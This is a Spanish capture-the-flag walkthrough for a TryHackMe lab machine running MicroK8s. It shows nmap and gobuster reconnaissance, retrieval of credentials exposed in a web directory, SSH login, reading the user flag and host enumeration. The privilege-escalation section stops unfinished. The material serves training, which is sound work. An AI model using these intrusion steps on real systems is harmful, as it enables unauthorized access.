## TryHackMe  <> Frank & Herby make an app

![image](https://github.com/Esevka/CTF/assets/139042999/e186482d-36eb-48bb-a418-e7cfebe204f1)

Enlace Maquina: https://tryhackme.com/room/frankandherby

Enunciado : Responder a una serie de preguntas y obtener las flags de usuario y root.
---
---

## Escaneo de puertos

-Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido por proximidad al valor 64 podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frankherby_app/nmap]
    └─# ping -c1 10.10.209.46  
    PING 10.10.209.46 (10.10.209.46) 56(84) bytes of data.
    64 bytes from 10.10.209.46: icmp_seq=1 ttl=63 time=58.4 ms
    
    --- 10.10.209.46 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 58.395/58.395/58.395/0.000 ms
    
-Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).
 
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frankherby_app/nmap]
    └─# nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn 10.10.209.46 -oN openinfo_ports 
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-13 16:34 CEST
    
    PORT      STATE SERVICE     VERSION
    22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 6479100d726723804a1a358e0beca189 (RSA)
    |   256 3b0ee7e9a51ae4c5c7880dfeeeac9565 (ECDSA)
    |_  256 d8a71675a71b265ca92e3facc0edda5c (ED25519)
    
    3000/tcp  open  ppp?
    | fingerprint-strings: 
    |   GetRequest: 
    |     HTTP/1.1 200 OK
    |     X-XSS-Protection: 1
    |     X-Content-Type-Options: nosniff
    |     X-Frame-Options: sameorigin
    |     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
    |     X-Instance-ID: 98wvRGephybwghDgW
    |     Content-Type: text/html; charset=utf-8
    |     Vary: Accept-Encoding
    |     Date: Sun, 13 Aug 2023 14:35:31 GMT
    |     Connection: close
    |     <!DOCTYPE html>
    |     <html>
    |     <head>
    |     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
    |     <meta charset="utf-8" />
    |     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    |     <meta http-equiv="expires" content="-1" />
    |     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    |     <meta name="fragment" content="!" />
    |     <meta name="distribution" content
    |   HTTPOptions: 
    |     HTTP/1.1 200 OK
    |     X-XSS-Protection: 1
    |     X-Content-Type-Options: nosniff
    |     X-Frame-Options: sameorigin
    |     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
    |     X-Instance-ID: 98wvRGephybwghDgW
    |     Content-Type: text/html; charset=utf-8
    |     Vary: Accept-Encoding
    |     Date: Sun, 13 Aug 2023 14:35:32 GMT
    |     Connection: close
    |     <!DOCTYPE html>
    |     <html>
    |     <head>
    |     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
    |     <meta charset="utf-8" />
    |     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    |     <meta http-equiv="expires" content="-1" />
    |     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    |     <meta name="fragment" content="!" />
    |_    <meta name="distribution" content
    
    10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=dev-01@1633275132
    | Subject Alternative Name: DNS:dev-01
    | Not valid before: 2021-10-03T14:32:12
    |_Not valid after:  2022-10-03T14:32:12
    
    10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    10257/tcp open  ssl/unknown
    | fingerprint-strings: 
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Sun, 13 Aug 2023 14:35:38 GMT
    |     Content-Length: 185
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
    |   HTTPOptions: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Sun, 13 Aug 2023 14:35:39 GMT
    |     Content-Length: 189
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
    | ssl-cert: Subject: commonName=localhost@1691937245
    | Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
    | Not valid before: 2023-08-13T13:33:32
    |_Not valid after:  2024-08-12T13:33:32
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |   h2
    |_  http/1.1
    
    10259/tcp open  ssl/unknown
    | fingerprint-strings: 
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Sun, 13 Aug 2023 14:35:38 GMT
    |     Content-Length: 185
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
    |   HTTPOptions: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Sun, 13 Aug 2023 14:35:39 GMT
    |     Content-Length: 189
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=localhost@1691937222
    | Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
    | Not valid before: 2023-08-13T13:33:32
    |_Not valid after:  2024-08-12T13:33:32
    | tls-alpn: 
    |   h2
    |_  http/1.1
    
    16443/tcp open  ssl/unknown
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     HTTP/1.0 401 Unauthorized
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Sun, 13 Aug 2023 14:36:06 GMT
    |     Content-Length: 129
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 401 Unauthorized
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Sun, 13 Aug 2023 14:35:38 GMT
    |     Content-Length: 129
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    |   HTTPOptions: 
    |     HTTP/1.0 401 Unauthorized
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Sun, 13 Aug 2023 14:35:39 GMT
    |     Content-Length: 129
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
    | Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.209.46, IP Address:172.17.0.1
    | Not valid before: 2023-08-13T14:32:29
    |_Not valid after:  2024-08-12T14:32:29
    | tls-alpn: 
    |   h2
    |_  http/1.1
    
    25000/tcp open  ssl/http    Gunicorn 19.7.1
    |_ssl-date: TLS randomness does not represent time
    |_http-title: 404 Not Found
    | ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
    | Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.209.46, IP Address:172.17.0.1
    | Not valid before: 2023-08-13T14:32:29
    |_Not valid after:  2024-08-12T14:32:29
    |_http-server-header: gunicorn/19.7.1
    
    31337/tcp open  http        nginx 1.21.3
    |_http-server-header: nginx/1.21.3
    |_http-title: Heroic Features - Start Bootstrap Template
    
    32000/tcp open  http        Docker Registry (API: 2.0)
    |_http-title: Site doesn't have a title.

Nmap ha obtenido toda esta cantidad de informacion, extraemos la info de cada puerto para una mejor lectura

    22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    3000/tcp  open  ppp?
    10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    10257/tcp open  ssl/unknown
    10259/tcp open  ssl/unknown
    16443/tcp open  ssl/unknown
    25000/tcp open  ssl/http    Gunicorn 19.7.1
    31337/tcp open  http        nginx 1.21.3
    32000/tcp open  http        Docker Registry (API: 2.0)

## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

Tras analizar toda la info hemos decidido empezar por el puerto 31337/tcp open  http  nginx 1.21.3

-Fuzzeamos la web en busqueda de directorios que contengan informacion util

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frankherby_app/nmap]
    └─# gobuster dir -u http://10.10.209.46:31337/ -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -o ../fuzz 2>/dev/null
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    /%2e%2e//google.com   (Status: 400) [Size: 157]
    /.                    (Status: 200) [Size: 4795]
    /.git------------     (Status: 200) [Size: 50]
    //                    (Status: 200) [Size: 4795]
    /assets/              (Status: 403) [Size: 153]
    /css/                 (Status: 403) [Size: 153]
    /css                  (Status: 301) [Size: 169] [--> http://10.10.209.46/css/]
    /index.html           (Status: 200) [Size: 4795]
    /vendor/              (Status: 403) [Size: 153]

Revisamos todos los directorios encontrados en busqueda de informacion valida, en el directorio /.git------ encontramos unas credenciales interesantes.
Para obtener las credenciales lo podemos hacer con el comando curl o con el  navegador nos descargamos el ficherito y listo.

Esctructura de las credenciales encontradas--> [protocolo web][usuario]:[password(urlencondeada)]@[ip equipo conexion]

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frankherby_app/nmap]
    └─# curl http://10.10.209.46:31337/.git-------     

            frank:passwd

Si recordamos en la fase de enumeracion de puertos vemos que el puerto 22 corre un servicio ssh, probamos credenciales.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frankherby_app/nmap]
    └─# ssh frank@10.10.209.46
    The authenticity of host '10.10.209.46 (10.10.209.46)' can't be established.

    frank@10.10.209.46's password: --------> passwd(decode)
    
    Last login: Fri Oct 29 10:47:08 2021 from 192.168.120.38
    frank@dev-01:~$ 

Por lo que ya hemos completado la fase de explotacion de la maquina hemos obtenidos unas credenciales que nos permiten conectarnos por el servicio SSH.

## Elevamos privilegios y obtenemos flags.

- Obtenemos la flag de usuario

        frank@dev-01:~$ cd /home
        frank@dev-01:/home$ ls
        frank  herby
        frank@dev-01:/home$ cd frank/
        frank@dev-01:~$ ls
        repos  snap  user.txt
        frank@dev-01:~$ cat user.txt 
        THM{------}
    
- Enumeramos la maquina en busqueda de info para intentar elevar privilegios.

    Sabemos que la maquina esta corriendo Microk8s/Kubernetes,aun asi vamos a verificar la presencia de Microk8s en la maquina.
    Info sobe que es Microk8s --> https://ciberninjas.com/microk8s-un-kubernetes-diferentes/
    
    Listamos el fichero group y vemos que tanto el usuario frank como el usuario herby pertenecen al grupo microk8s
    
        frank@dev-01:/home/herby$ cat /etc/group | grep -E 'frank|herby'
            adm:x:4:syslog,herby
            cdrom:x:24:herby
            sudo:x:27:herby
            dip:x:30:herby
            plugdev:x:46:herby
            lxd:x:116:herby
            herby:x:1000:
            microk8s:x:998:herby,frank
            frank:x:1001:
            docker:x:117:herby
    
    Listamos procesos que estan corriendo
        
        frank@dev-01:~$ ps -ax | grep microk8s
        
        700 ?        Ss     0:05 /bin/bash /snap/microk8s/2546/apiservice-kicker
        702 ?        Ss     0:00 /bin/bash /snap/microk8s/2546/run-cluster-agent-with-args
        [...]
    
    Listamos conexiones entrantes y salientes de la maquina
    
        frank@dev-01:~$ ss -a | grep -Ei 'microk8s|kubernetes'
        u_str             LISTEN                 0                   128                                                      @snap.microk8s.dqlite-3297041220608546238 340852                                   
        u_str             LISTEN                 0                   4096                                      /var/snap/microk8s/2546/var/kubernetes/backend/kine.sock 342176                               
        u_str             LISTEN                 0                   4096                             /var/snap/microk8s/common/var/lib/kubelet/pod-resources/161155252 356673  
        [...]
    
    Informacion mas que suficiente para ver que esta corriendo microk8s|kubernetes en la maquina.
   

- Elevamos privilegios mediante, Microk8s Kubernetes Pod. Info: https://bishopfox.com/blog/kubernetes-pod-privilege-escalation

    1) ww








  
  
